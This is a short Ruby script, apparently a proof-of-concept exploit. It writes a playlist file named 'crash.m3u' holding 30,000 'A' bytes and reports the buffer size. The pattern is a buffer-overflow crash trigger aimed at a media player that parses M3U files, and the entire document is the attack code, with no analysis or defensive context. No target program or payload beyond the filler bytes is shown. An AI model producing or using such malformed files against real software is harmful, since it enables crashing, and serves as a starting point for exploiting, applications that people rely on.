#!/usr/bin/env ruby

file = "crash.m3u"
junk = "\x41" * 30000
File.open(file, 'w') {|f| f.write(junk)}

puts "[*] Buffer create with size: #{junk.size}"